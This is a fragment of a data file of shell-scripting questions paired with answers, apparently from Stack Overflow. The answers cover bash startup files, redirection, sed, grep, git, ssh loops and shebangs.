    "How do I pipe a subprocess call to a text file?": "If you want to write the output to a file you can use the stdout-argument of subprocess.call.\nIt takes either\nNone (the default, stdout is inherited from the parent (your script))\nsubprocess.PIPE (allows you to pipe from one command/process to another)\na file object or a file descriptor (what you want, to have the output written to a file)\nYou need to open a file with something like open and pass the object or file descriptor integer to call:\nf = open(\"blah.txt\", \"w\")\nsubprocess.call([\"/home/myuser/run.sh\", \"/tmp/ad_xml\",  \"/tmp/video_xml\"], stdout=f)\nI'm guessing any valid file-like object would work, like a socket (gasp :)), but I've never tried.\nAs marcog mentions in the comments you might want to redirect stderr as well, you can redirect this to the same location as stdout with stderr=subprocess.STDOUT. Any of the above mentioned values works as well, you can redirect to different places.",
    "How to handle more than 10 parameters in shell": "Use curly braces to set them off:\necho \"${10}\"\nAny positional parameter can be saved in a variable to document its use and make later statements more readable:\ncity_name=${10}\nIf fewer parameters are passed then the value at the later positions will be unset.\nYou can also iterate over the positional parameters like this:\nfor arg\nor\nfor arg in \"$@\"\nor\nwhile (( $# > 0 ))    # or [ $# -gt 0 ]\ndo\n    echo \"$1\"\n    shift\ndone",
    "What does set -e and exec \"$@\" do for docker entrypoint scripts?": "It basically takes any command line arguments passed to entrypoint.sh and execs them as a command. The intention is basically \"Do everything in this .sh script, then in the same shell run the command the user passes in on the command line\".\nSee:\nWhat are the special dollar sign shell variables?\nNeed explanations for Linux bash builtin exec command behavior",
    "How to make zsh run as a login shell on Mac OS X (in iTerm)?": "chsh -s $(which zsh)\nYou'll be prompted for your password, but once you update your settings any new iTerm/Terminal sessions you start on that machine will default to zsh.",
    "Reload .profile in bash shell script (in unix)?": "Try this to reload your current shell:\nsource ~/.profile",
    "Why doesn't \"total\" from ls -l add up to total file sizes listed? [closed]": "You can find the definition of that line in the ls documentation for your platform. For coreutils ls (the one found on a lot of Linux systems), the information can be found via info coreutils ls:\nFor each directory that is listed, preface the files with a line `total BLOCKS', where BLOCKS is the total disk allocation for all files in that directory.",
    "How do I paste multi-line bash codes into terminal and run it all at once?": "Try putting \\ at the end of each line before copying it.\nExample:\necho \"Hello world\" && \\\nscript_b.sh\n\necho $?\nThe exit code ($?) is now the full sequence of commands, and not just the last command.",
    "Should aliases go in .bashrc or .bash_profile? [duplicate]": "The reason you separate the login and non-login shell is because the .bashrc file is reloaded every time you start a new copy of Bash. The .profile file is loaded only when you either log in or use the appropriate flag to tell Bash to act as a login shell.\nPersonally,\nI put my PATH setup into a .profile file (because I sometimes use other shells);\nI put my Bash aliases and functions into my .bashrc file;\nI put this\n#!/bin/bash\n#\n# CRM .bash_profile Time-stamp: \"2008-12-07 19:42\"\n#\n# echo \"Loading ${HOME}/.bash_profile\"\nsource ~/.profile # get my PATH setup\nsource ~/.bashrc  # get my Bash aliases\nin my .bash_profile file.\nOh, and the reason you need to type bash again to get the new alias is that Bash loads your .bashrc file when it starts but it doesn't reload it unless you tell it to. You can reload the .bashrc file (and not need a second shell) by typing\nsource ~/.bashrc\nwhich loads the .bashrc file as if you had typed the commands directly to Bash.",
    "'git add --patch' to include new files?": "When I tried git add -p someNewFile.txt on a new file (an untracked file), git would simply output No changes. and stop. I had to tell git that I intended to track the new file first.\ngit add -N someNewFile.txt\ngit add -p\nHowever, since the file was untracked, it would show up as one giant hunk that couldn't be split (because it is all new!). So, then I needed to edit the hunk into smaller bits. If you're not familiar with that, checkout this reference to get started.\nUpdate - Hunk editing info I wanted to update this in case the above reference goes away. Because the new file is untracked, git add -p will show every line in the file as a new line in one hunk. It will then ask you what you want to do with that hunk, giving you the following prompt:\nStage this hunk [y,n,q,a,d,/,e,?]?\nAssuming that you do not want to commit the whole hunk (and thus, the whole file; because I am not sure why you would want to use git add -p in that case?), you will want to specify option e to tell git that you want to edit the hunk.\nOnce you tell git that you want to edit the hunk, it should drop you into your editor of choice so you can make your changes. All lines should be prefixed with a + and git has some explanatory comments (prefixed with a #) at the end of the file. Simply delete any lines that you do not want in your initial commit of the file. Then save and quit the editor.\nGit's explanation of git's hunk options:\ny - stage this hunk\nn - do not stage this hunk\nq - quit; do not stage this hunk or any of the remaining ones\na - stage this hunk and all later hunks in the file\nd - do not stage this hunk or any of the later hunks in the file\ng - select a hunk to go to\n/ - search for a hunk matching the given regex\nj - leave this hunk undecided, see next undecided hunk\nJ - leave this hunk undecided, see next hunk\nk - leave this hunk undecided, see previous undecided hunk\nK - leave this hunk undecided, see previous hunk\ns - split the current hunk into smaller hunks\ne - manually edit the current hunk\n? - print help",
    "How does bash tab completion work?": "There are two parts to the autocompletion:\nThe readline library, as already mentioned by fixje, manages the command line editing, and calls back to bash when tab is pressed, to enable completion. Bash then gives (see next point) a list of possible completions, and readline inserts as much characters as are identified unambiguously by the characters already typed in. (You can configure the readline library quite much, see the section Command line editing of the Bash manual for details.)\nBash itself has the built-in complete to define a completion mechanism for individual commands. If for the current command nothing is defined, it used completion by file name (using opendir/readdir, as Ignacio said).\nThe part to define your own completions is described in the section Programmable Completion. In short, with complete \u00aboptions\u00bb \u00abcommand\u00bb you define the completion for some command. For example complete -u su says when completing an argument for the su command, search for users of the current system.\nIf this is more complicated than the normal options can cover (e.g. different completions depending on argument index, or depending on previous arguments), you can use -F function, which will then invoke a shell function to generate the list of possible completions. (This is used for example for the git completion, which is very complicated, depending on subcommand and sometimes on options given, and using sometimes names of branches (which are nothing bash knows about).\nYou can list the existing completions defined in your current bash environment using simply complete, to have an impression on what is possible. If you have the bash-completion package installed (or however it is named on your system), completions for a lot of commands are installed, and as Wrikken said, /etc/bash_completion contains a bash script which is then often executed at shell startup to configure this. Additional custom completion scripts may be placed in /etc/bash_completion.d; those are all sourced from /etc/bash_completion.",
    "Using sed, how do you print the first 'N' characters of a line?": "Don't use sed, use cut:\ngrep .... | cut -c 1-N\nIf you MUST use sed:\ngrep ... | sed -e 's/^\\(.\\{12\\}\\).*/\\1/'",
    "What does `kill -0 $pid` in a shell script do?": "sending the signal 0 to a given PID just checks if any process with the given PID is running and you have the permission to send a signal to it.\nFor more information see the following manpages:\nkill(1)\n$ man 1 kill\n...\nIf sig is 0, then no signal is sent, but error checking is still performed.\n...\nkill(2)\n$ man 2 kill\n...\nIf sig is 0, then no signal is sent, but error checking is still performed; this \ncan be used to check for the existence of a process ID or process group ID.\n...",
    "shell-script headers (#!/bin/sh vs #!/bin/csh)": "This is known as a Shebang:\nhttp://en.wikipedia.org/wiki/Shebang_(Unix)\n#!interpreter [optional-arg]\nA shebang is only relevant when a script has the execute permission (e.g. chmod u+x script.sh).\nWhen a shell executes the script it will use the specified interpreter.\nExample:\n#!/bin/bash\n# file: foo.sh\necho 1\n\n$ chmod u+x foo.sh\n$ ./foo.sh\n  1",
    "macOS Catalina 10.15(beta) - Why is ~/.bash_profile not sourced by my shell?": "Apple has changed the default shell to zsh. Therefore you have to rename your configuration files. .bashrc is now .zshrc and .bash_profile is now .zprofile.",
    "Call Python script from bash with argument": "To execute a python script in a bash script you need to call the same command that you would within a terminal. For instance\n> python python_script.py var1 var2\nTo access these variables within python you will need\nimport sys\nprint(sys.argv[0]) # prints python_script.py\nprint(sys.argv[1]) # prints var1\nprint(sys.argv[2]) # prints var2",
    "What are the differences between a login shell and interactive shell?": "An interactive shell is one started without non-option arguments, unless -s is specified, without specifying the -c option, and whose input and error output are both connected to terminals (as determined by isatty(3)), or one started with the -i option.\nAn interactive shell generally reads from and writes to a user\u2019s terminal.\n[gnu bash manual]\nA login shell is a shell where you login. You can recognize a login shell from a ps -f listing, it will have a hyphen at the start of the program name, for example:\nroot      3561  3553  0 09:38 pts/0    00:00:00 -bash\nqa        7327  3432  0 10:46 pts/1    00:00:00 -bash\nAn interactive shell is one which reads commands from its standard-input, usually a terminal.\nFor example,\nif you login to bash using an xterm or terminal emulator like putty, then the session is both a login shell and an interactive one.\nif you then type bash then you enter an interactive shell, but it is not a login shell.\nIf a shell script (a file containing shell commands) is run, then it is neither a login shell nor an interactive one.\nStart-up files are highly tailorable in bash:\nWhen a login bash shell is invoked, then /etc/profile is sourced (executed in the current environment). After that, three files are checked for existence. The checks for these files are done in this order, the first one that exists is run.\n~/.bash_profile\n~/.bash_login\n~/.profile\nOnce a match is found, the other files are ignored, even if they exist. The /etc/bashrc file might be used by both the ~/.bash_profile and the ~/.bashrc files. That would mean that the /etc/bashrc file is sourced on all interactive invocations of bash, whether it is a login or non-login shell.\nSo, the .bashrc file is also run every time you request a new interactive shell. This does not include a shell script. Normally variables, aliases or functions are placed in this file.\nBash shell scripts read a different file if suitably instructed. If the user defines (usually in their own .bash_profile) a variable BASH_ENV which contains a filename, scripts will read this. If this variable is not set (and exported) then bash scripts will not read any startup files.",
    "How do I edit /etc/sudoers from a script?": "Old thread, but what about:\necho 'foobar ALL=(ALL:ALL) ALL' | sudo EDITOR='tee -a' visudo",
    "How do you grep a file and get the next 5 lines": "You want:\ngrep -A 5 '19:55' file\nFrom man grep:\nContext Line Control\n\n-A NUM, --after-context=NUM\n\nPrint NUM lines of trailing context after matching lines.  \nPlaces a line containing a gup separator (described under --group-separator) \nbetween contiguous groups of matches.  With the -o or --only-matching\noption, this has no effect and a warning is given.\n\n-B NUM, --before-context=NUM\n\nPrint NUM lines of leading context before matching lines.  \nPlaces a line containing a group separator (described under --group-separator) \nbetween contiguous groups of matches.  With the -o or --only-matching\noption, this has no effect and a warning is given.\n\n-C NUM, -NUM, --context=NUM\n\nPrint NUM lines of output context.  Places a line containing a group separator\n(described under --group-separator) between contiguous groups of matches.  \nWith the -o or --only-matching option,  this  has  no effect and a warning\nis given.\n\n--group-separator=SEP\n\nUse SEP as a group separator. By default SEP is double hyphen (--).\n\n--no-group-separator\n\nUse empty string as a group separator.",
    "What does \"export\" do in shell programming? [duplicate]": "Exported variables such as $HOME and $PATH are available to (inherited by) other programs run by the shell that exports them (and the programs run by those other programs, and so on) as environment variables. Regular (non-exported) variables are not available to other programs.\n$ env | grep '^variable='\n$                                 # No environment variable called variable\n$ variable=Hello                  # Create local (non-exported) variable with value\n$ env | grep '^variable='\n$                                 # Still no environment variable called variable\n$ export variable                 # Mark variable for export to child processes\n$ env | grep '^variable='\nvariable=Hello\n$\n$ export other_variable=Goodbye   # create and initialize exported variable\n$ env | grep '^other_variable='\nother_variable=Goodbye\n$\nFor more information, see the entry for the export builtin in the GNU Bash manual, and also the sections on command execution environment and environment.\nNote that non-exported variables will be available to subshells run via ( ... ) and similar notations because those subshells are direct clones of the main shell:\n$ othervar=present\n$ (echo $othervar; echo $variable; variable=elephant; echo $variable)\npresent\nHello\nelephant\n$ echo $variable\nHello\n$\nThe subshell can change its own copy of any variable, exported or not, and may affect the values seen by the processes it runs, but the subshell's changes cannot affect the variable in the parent shell, of course.\nSome information about subshells can be found under command grouping and command execution environment in the Bash manual.",
    "What's the magic of \"-\" (a dash) in command-line parameters?": "If you mean the naked - at the end of the tar command, that's common on many commands that want to use a file.\nIt allows you to specify standard input or output rather than an actual file name.\nThat's the case for your first and third example. For example, the cdrecord command is taking standard input (the ISO image stream produced by mkisofs) and writing it directly to /dev/dvdrw.\nWith the cd command, every time you change directory, it stores the directory you came from. If you do cd with the special - \"directory name\", it uses that remembered directory instead of a real one. You can easily switch between two directories quite quickly by using that.\nOther commands may treat - as a different special value.",
    "Portable way to get file size (in bytes) in the shell": "wc -c < filename (short for word count, -c prints the byte count) is a portable, POSIX solution. Only the output format might not be uniform across platforms as some spaces may be prepended (which is the case for Solaris).\nDo not omit the input redirection. When the file is passed as an argument, the file name is printed after the byte count.\nI was worried it wouldn't work for binary files, but it works OK on both Linux and Solaris. You can try it with wc -c < /usr/bin/wc. Moreover, POSIX utilities are guaranteed to handle binary files, unless specified otherwise explicitly.",
    "Redirect STDERR / STDOUT of a process AFTER it's been started, using command line?": "Short of closing and reopening your tty (i.e. logging off and back on, which may also terminate some of your background processes in the process) you only have one choice left:\nattach to the process in question using gdb, and run:\np dup2(open(\"/dev/null\", 0), 1)\np dup2(open(\"/dev/null\", 0), 2)\ndetach\nquit\ne.g.:\n$ tail -f /var/log/lastlog &\n[1] 5636\n\n$ ls -l /proc/5636/fd\ntotal 0\nlrwx------ 1 myuser myuser 64 Feb 27 07:36 0 -> /dev/pts/0\nlrwx------ 1 myuser myuser 64 Feb 27 07:36 1 -> /dev/pts/0\nlrwx------ 1 myuser myuser 64 Feb 27 07:36 2 -> /dev/pts/0\nlr-x------ 1 myuser myuser 64 Feb 27 07:36 3 -> /var/log/lastlog\n\n$ gdb -p 5636\nGNU gdb 6.8-debian\nCopyright (C) 2008 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nAttaching to process 5636\nReading symbols from /usr/bin/tail...(no debugging symbols found)...done.\nReading symbols from /lib/librt.so.1...(no debugging symbols found)...done.\nLoaded symbols for /lib/librt.so.1\nReading symbols from /lib/libc.so.6...(no debugging symbols found)...done.\nLoaded symbols for /lib/libc.so.6\nReading symbols from /lib/libpthread.so.0...(no debugging symbols found)...done.\n[Thread debugging using libthread_db enabled]\n[New Thread 0x7f3c8f5a66e0 (LWP 5636)]\nLoaded symbols for /lib/libpthread.so.0\nReading symbols from /lib/ld-linux-x86-64.so.2...(no debugging symbols found)...done.\nLoaded symbols for /lib64/ld-linux-x86-64.so.2\n\n(no debugging symbols found)\n0x00007f3c8eec7b50 in nanosleep () from /lib/libc.so.6\n\n(gdb) p dup2(open(\"/dev/null\",0),1)\n[Switching to Thread 0x7f3c8f5a66e0 (LWP 5636)]\n$1 = 1\n\n(gdb) p dup2(open(\"/dev/null\",0),2)\n$2 = 2\n\n(gdb) detach\nDetaching from program: /usr/bin/tail, process 5636\n\n(gdb) quit\n\n$ ls -l /proc/5636/fd\ntotal 0\nlrwx------ 1 myuser myuser 64 Feb 27 07:36 0 -> /dev/pts/0\nlrwx------ 1 myuser myuser 64 Feb 27 07:36 1 -> /dev/null\nlrwx------ 1 myuser myuser 64 Feb 27 07:36 2 -> /dev/null\nlr-x------ 1 myuser myuser 64 Feb 27 07:36 3 -> /var/log/lastlog\nlr-x------ 1 myuser myuser 64 Feb 27 07:36 4 -> /dev/null\nlr-x------ 1 myuser myuser 64 Feb 27 07:36 5 -> /dev/null\nYou may also consider:\nusing screen; screen provides several virtual TTYs you can switch between without having to open new SSH/telnet/etc, sessions\nusing nohup; this allows you to close and reopen your session without losing any background processes in the... process.",
    "Convert date time string to epoch in Bash": "What you're looking for is date --date='06/12/2012 07:21:22' +\"%s\". Keep in mind that this assumes you're using GNU coreutils, as both --date and the %s format string are GNU extensions. POSIX doesn't specify either of those, so there is no portable way of making such conversion even on POSIX compliant systems.\nConsult the appropriate manual page for other versions of date.\nNote: bash --date and -d option expects the date in US or ISO8601 format, i.e. mm/dd/yyyy or yyyy-mm-dd, not in UK, EU, or any other format.",
    "How to escape os.system() calls?": "shlex.quote() does what you want since python 3.\n(Use pipes.quote to support both python 2 and python 3, though note that pipes has been deprecated since 3.10 and slated for removal in 3.13)",
    "How to insert a newline in front of a pattern?": "This works in bash and zsh, tested on Linux and OS X:\nsed 's/regexp/\\'$'\\n/g'\nIn general, for $ followed by a string literal in single quotes bash performs C-style backslash substitution, e.g. $'\\t' is translated to a literal tab. Plus, sed wants your newline literal to be escaped with a backslash, hence the \\ before $. And finally, the dollar sign itself shouldn't be quoted so that it's interpreted by the shell, therefore we close the quote before the $ and then open it again.\nEdit: As suggested in the comments by @mklement0, this works as well:\nsed $'s/regexp/\\\\\\n/g'\nWhat happens here is: the entire sed command is now a C-style string, which means the backslash that sed requires to be placed before the new line literal should now be escaped with another backslash. Though more readable, in this case you won't be able to do shell string substitutions (without making it ugly again.)",
    "Running bash scripts with npm": "Its totally possible...\n\"scripts\": {\n   \"build\": \"./build.sh\"\n},\nalso, make sure you put a hash bang at the top of your bash file #!/usr/bin/env bash\nalso make sure you have permissions to execute the file\nchmod +x ./build.sh\nFinally, the command to run build in npm would be\nnpm run build",
    "How can I open a Shell inside a Vim Window?": "Neovim and Vim 8.2 support this natively via the :ter[minal] command.\nSee terminal-window in the docs for details.",
    "Display current date and time without punctuation": "Here you go:\ndate +%Y%m%d%H%M%S\nAs man date says near the top, you can use the date command like this:\ndate [OPTION]... [+FORMAT]\nThat is, you can give it a format parameter, starting with a +. You can probably guess the meaning of the formatting symbols I used:\n%Y is for year\n%m is for month\n%d is for day\n... and so on\nYou can find this, and other formatting symbols in man date.",
    "How do I change bash history completion to complete what's already on the line?": "Probably something like\n# ~/.inputrc\n\"\\e[A\": history-search-backward\n\"\\e[B\": history-search-forward\nor equivalently,\n# ~/.bashrc\nif [[ $- == *i* ]]\nthen\n    bind '\"\\e[A\": history-search-backward'\n    bind '\"\\e[B\": history-search-forward'\nfi\n(the if statement checks for interactive mode)\nNormally, Up and Down are bound to the Readline functions previous-history and next-history respectively. I prefer to bind PgUp/PgDn to these functions, instead of displacing the normal operation of Up/Down.\n# ~/.inputrc\n\"\\e[5~\": history-search-backward\n\"\\e[6~\": history-search-forward\nAfter you modify ~/.inputrc, restart your shell or use Ctrl+X, Ctrl+R to tell it to re-read ~/.inputrc.\nBy the way, if you're looking for relevant documentation:\nBash uses The GNU Readline Library for the shell prompt and history.",
    "How do I grab an INI value within a shell script?": "How about grepping for that line then using awk\nversion=$(awk -F \"=\" '/database_version/ {print $2}' parameters.ini)",
    "How to move all files including hidden files into parent directory via *": "You can find a comprehensive set of solutions on this in UNIX & Linux's answer to How do you move all files (including hidden) from one directory to another?. It shows solutions in Bash, zsh, ksh93, standard (POSIX) sh, etc.\nYou can use these two commands together:\nmv /path/subfolder/* /path/   # your current approach\nmv /path/subfolder/.* /path/  # this one for hidden files\nOr all together (thanks pfnuesel):\nmv /path/subfolder/{.,}* /path/\nWhich expands to:\nmv /path/subfolder/* /path/subfolder/.* /path/\n(example: echo a{.,}b expands to a.b ab)\nNote this will show a couple of warnings:\nmv: cannot move \u2018/path/subfolder/.\u2019 to /path/.\u2019: Device or resource busy\nmv: cannot remove /path/subfolder/..\u2019: Is a directory\nJust ignore them: this happens because /path/subfolder/{.,}* also expands to /path/subfolder/. and /path/subfolder/.., which are the directory and the parent directory (See What do \u201c.\u201d and \u201c..\u201d mean when in a folder?).\nIf you want to just copy, you can use a mere:\ncp -r /path/subfolder/. /path/\n#                     ^\n#                     note the dot!\nThis will copy all files, both normal and hidden ones, since /path/subfolder/. expands to \"everything from this directory\" (Source: How to copy with cp to include hidden files and hidden directories and their contents?)",
    "How do I add tab completion to the Python shell?": "I may have found a way to do it.\nCreate a file .pythonrc\n# ~/.pythonrc\n# enable syntax completion\ntry:\n    import readline\nexcept ImportError:\n    print(\"Module readline not available.\")\nelse:\n    import rlcompleter\n    readline.parse_and_bind(\"tab: complete\")\nthen in your .bashrc file, add\nexport PYTHONSTARTUP=~/.pythonrc\nThat seems to work.",
    "Define a Makefile variable using a ENV variable or a default value": "To follow up on my comments above, here's an example:\nT ?= foo\nall:\n        $(info T is $(T))\nNow if I run the Makefile in various ways, it behaves as we expect (I get foo only if I don't set T either on the command line or environment):\n$ make\nT is foo\n\n$ make T=bar\nT is bar\n\n$ T=bar make\nT is bar",
    "Appropriate hashbang for Node.js scripts": "If your script is intended for use by Node developers, you should absolutely just use\n#!/usr/bin/env node\nand not bother trying for compatibility with people who only have Node installed as nodejs.\nRationale:\nIt's what the cool kids are doing, and if you don't do it too, you're not cool. Major node projects like jshint, karma, bower, and even npm simply use #!/usr/bin/env node as the shebang for their executable scripts.\nBecause the cool kids are doing it, anyone who works with Node on Ubuntu has set up a /usr/bin/node as a symlink to nodejs. There are highly-viewed instructions on doing this here on Stack Overflow, and all over the web. There was even the nodejs-legacy package whose entire purpose was to create this symlink for you. People who use Node know how to fix this problem on Ubuntu, and they have to if they want to use pretty much any software ever written in Node.\nThe problem doesn't even seem to exist any more on Ubuntu 14.04; I just purged Node and ran an apt-get install nodejs and it created /usr/bin/node as a symlink to /etc/alternatives/node. People afflicted by this issue are, I suspect, a shrinking minority.\nEven if you're targeting Node-illiterate people, you may still want to use #!/usr/bin/env node, perhaps adding the possible need for manual symlink creation or installation of the nodejs-legacy package to your installation documentation if you deem it necessary. Note that if somebody with nodejs but not node available tries to run your program with the above shebang, they'll see:\n/usr/bin/env: node: No such file or directory\nand Googling that will give them the fix in the first result and many times on the first page.\nIf you truly, desperately want to make sure that the user can run your software on a system where nodejs is available but node is not (or where node is actually the Amateur Packet Radio Node program), then you can use this \"two-line shebang\" taken from Unix & Linux Stack Exchange:\n#!/bin/sh\n':' //; exec \"$(command -v nodejs || command -v node)\" \"$0\" \"$@\"\n\nconsole.log('Hello world!');\nbut do you really need to do this when almost nobody else in the Node world is?",
    "Repository 'http://security.debian.org/debian-security buster/updates InRelease' changed its 'Suite' value from 'stable' to 'oldstable'": "",
    "Test if a variable is set in Bash when using \"set -o nounset\"": "#!/bin/bash\n\nset -o nounset\n\n\nVALUE=${WHATEVER:-}\n\nif [ ! -z ${VALUE} ];\n then echo \"yo\"\nfi\n\necho \"whatever\"\nIn this case, VALUE ends up being an empty string if WHATEVER is not set. We're using the {parameter:-word} expansion, which you can look up in man bash under \"Parameter Expansion\".",
    "write a shell script to ssh to a remote machine and execute commands": "There are multiple remote linux machines, and I need to write a shell script which will execute the same set of commands in each machine. (Including some sudo operations). How can this be done using shell scripting?\nYou can do this with ssh, for example:\n#!/bin/bash\nUSERNAME=someUser\nHOSTS=\"host1 host2 host3\"\nSCRIPT=\"pwd; ls\"\nfor HOSTNAME in ${HOSTS} ; do\n    ssh -l ${USERNAME} ${HOSTNAME} \"${SCRIPT}\"\ndone\nWhen ssh'ing to the remote machine, how to handle when it prompts for RSA fingerprint authentication.\nYou can add the StrictHostKeyChecking=no option to ssh:\nssh -o StrictHostKeyChecking=no -l username hostname \"pwd; ls\"\nThis will disable the host key check and automatically add the host key to the list of known hosts. If you do not want to have the host added to the known hosts file, add the option -o UserKnownHostsFile=/dev/null.\nNote that this disables certain security checks, for example protection against man-in-the-middle attack. It should therefore not be applied in a security sensitive environment.",
    "Replace a string in shell script using a variable": "If you want to interpret $replace, you should not use single quotes since they prevent variable substitution.\nTry:\necho $LINE | sed -e \"s/12345678/${replace}/g\"\nTranscript:\npax> export replace=987654321\npax> echo X123456789X | sed \"s/123456789/${replace}/\"\nX987654321X\npax> _\nJust be careful to ensure that ${replace} doesn't have any characters of significance to sed (like / for instance) since it will cause confusion unless escaped. But if, as you say, you're replacing one number with another, that shouldn't be a problem.",
    "Sending a mail from a linux shell script": "If the server is well configured, eg it has an up and running MTA, you can just use the mail command.\nFor instance, to send the content of a file, you can do this:\n$ cat /path/to/file | mail -s \"your subject\" your@email.com\nman mail for more details.",
    "How to add lines to end of file on Linux": "The easiest way is to redirect the output of the echo by >>:\necho 'VNCSERVERS=\"1:root\"' >> /etc/sysconfig/configfile\necho 'VNCSERVERARGS[1]=\"-geometry 1600x1200\"' >> /etc/sysconfig/configfile",
    "recursively add file extension to all files": "Alternative command without an explicit loop (man find):\nfind . -type f -exec mv '{}' '{}'.jpg \\;\nExplanation: this recursively finds all files (-type f) starting from the current directory (.) and applies the move command (mv) to each of them. Note also the quotes around {}, so that filenames with spaces (and even newlines...) are properly handled.",
    "Shell one liner to prepend to a file": "This still uses a temp file, but at least it is on one line:\necho \"text\" | cat - yourfile > /tmp/out && mv /tmp/out yourfile\nCredit: BASH: Prepend A Text / Lines To a File",
    "How to use multiple arguments for awk with a shebang (i.e. #!)?": "The shebang line has never been specified as part of POSIX, SUS, LSB or any other specification. AFAIK, it hasn't even been properly documented.\nThere is a rough consensus about what it does: take everything between the ! and the \\n and exec it. The assumption is that everything between the ! and the \\n is a full absolute path to the interpreter. There is no consensus about what happens if it contains whitespace.\nSome operating systems simply treat the entire thing as the path. After all, in most operating systems, whitespace or dashes are legal in a path.\nSome operating systems split at whitespace and treat the first part as the path to the interpreter and the rest as individual arguments.\nSome operating systems split at the first whitespace and treat the front part as the path to the interpeter and the rest as a single argument (which is what you are seeing).\nSome even don't support shebang lines at all.\nThankfully, 1. and 4. seem to have died out, but 3. is pretty widespread, so you simply cannot rely on being able to pass more than one argument.\nAnd since the location of commands is also not specified in POSIX or SUS, you generally use up that single argument by passing the executable's name to env so that it can determine the executable's location; e.g.:\n#!/usr/bin/env gawk\n[Obviously, this still assumes a particular path for env, but there are only very few systems where it lives in /bin, so this is generally safe. The location of env is a lot more standardized than the location of gawk or even worse something like python or ruby or spidermonkey.]\nWhich means that you cannot actually use any arguments at all.",
    "Better way of incrementing build number?": "I've messed around with a lot of the answers on this question, and none of them quite satisfied me. However, I finally came up with a mixture that I really like!\nWe simply set the version number for the built product to the number of Git commits. This won't mess with your source control, since the script only mutates the built product.\nAdd this \"Run Script\" build phase to the end of your build phases:\nif [ \"${CONFIGURATION}\" = \"Release\" ]; then\n    buildNumber=$(git rev-list --count head)\n    /usr/libexec/PlistBuddy -c \"Set :CFBundleVersion $buildNumber\" \"${TARGET_BUILD_DIR}/${INFOPLIST_PATH}\"\nfi\nSet your Info.plist version in your project to whatever you want, it will never get used when building a release build. I set mine to AUTOMATED or DEVELOPMENT so it's clear when I'm running a development build.\nThat's it! The built app will have a constantly increasing build number. (As long as you always do your builds off the same branch.)\nWhy I like this method:\nEasy\nDoesn't pollute Git version history\nCFBundleVersion is totally automatic\nThe pretty version number can be modified whenever I want\nOther notes:\nIf you have app extensions in your project, simply set the same build script on those targets too. This will keep all the version numbers automated and in sync. The App Store requires extension versions match your main app.",
    "How do I preserve the remote filename when Downloading a file using curl [duplicate]": "The solution is to use -O -J\n-O, --remote-name          Write output to a file named as the remote file  \n-J, --remote-header-name   Use the header-provided filename\nSo...\ncurl  -O -J  'http://oregondigital.org/cgi-bin/showfile.exe?CISOROOT=/baseball&CISOPTR=0'\nI had to upgrade my CURL. I had v 7.19 which doesn't support -J but 7.22 (which is the latest) does.",
    "Referring to a file relative to executing script": "See: BASH FAQ entry #28: \"How do I determine the location of my script? I want to read some config files from the same place.\"\nAny solution isn't going to work 100% of the time:\nIt is important to realize that in the general case, this problem has no solution. Any approach you might have heard of, and any approach that will be detailed below, has flaws and will only work in specific cases. First and foremost, try to avoid the problem entirely by not depending on the location of your script!\nIf you need to write a very reusable tool, then taking the correct path as a parameter to your script is going to be the most reliable method.\nAssuming your script is only going to be run from certain shells, and only with a little bit of flexibility required, you can probably relax some of this paranoia. It is still good to look at your options. There are common patterns that people use that are particularly problematic.\nIn particular, the FAQ recommends avoiding the very commonly used $0 variable:\nNothing that reads $0 will ever be bulletproof, because $0 itself is unreliable.\nAs an alternative, you could use $BASH_SOURCE instead. Something like this:\nsource \"${BASH_SOURCE%/*}/act.conf.sh\"\nThere are some caveats to this solution, too. Check out the FAQ page to see the trade-offs between different solutions. They seem to recommend cd in combination with $BASH_SOURCE in cases where it will work for you, as you get a handy error condition when it fails to expand properly.",
    "How to invoke bash, run commands inside the new shell, and then give control back to user?": "bash --rcfile <(echo '. ~/.bashrc; some_command')\ndispenses the creation of temporary files. Question on other sites:\nhttps://serverfault.com/questions/368054/run-an-interactive-bash-subshell-with-initial-commands-without-returning-to-the\nhttps://unix.stackexchange.com/questions/123103/how-to-keep-bash-running-after-command-execution",
    "Shell Script \u2014 Get all files modified after <date>": "as simple as:\nfind . -mtime -1 | xargs tar --no-recursion -czf myfile.tgz\nwhere find . -mtime -1 will select all the files in (recursively) current directory modified day before. you can use fractions, for example:\nfind . -mtime -1.5 | xargs tar --no-recursion -czf myfile.tgz",
    "What is the exact meaning of IFS=$'\\n'?": "Normally bash doesn't interpret escape sequences in string literals. So if you write \\n or \"\\n\" or '\\n', that's not a linebreak - it's the letter n (in the first case) or a backslash followed by the letter n (in the other two cases).\n$'somestring' is a syntax for string literals with escape sequences. So unlike '\\n', $'\\n' actually is a linebreak.",
    "Passing argument to alias in bash [duplicate]": "An alias will expand to the string it represents. Anything after the alias will appear after its expansion without needing to be or able to be passed as explicit arguments (e.g. $1).\n$ alias foo='/path/to/bar'\n$ foo some args\nwill get expanded to\n$ /path/to/bar some args\nIf you want to use explicit arguments, you'll need to use a function\n$ foo () { /path/to/bar \"$@\" fixed args; }\n$ foo abc 123\nwill be executed as if you had done\n$ /path/to/bar abc 123 fixed args\nTo undefine an alias:\nunalias foo\nTo undefine a function:\nunset -f foo\nTo see the type and definition (for each defined alias, keyword, function, builtin or executable file):\ntype -a foo\nOr type only (for the highest precedence occurrence):\ntype -t foo",
    "Iterating over each line of ls -l output": "Set IFS to newline, like this:\nIFS='\n'\nfor x in `ls -l $1`; do echo $x; done\nPut a sub-shell around it if you don't want to set IFS permanently:\n(IFS='\n'\nfor x in `ls -l $1`; do echo $x; done)\nOr use while | read instead:\nls -l $1 | while read x; do echo $x; done\nOne more option, which runs the while/read at the same shell level:\nwhile read x; do echo $x; done << EOF\n$(ls -l $1)\nEOF",
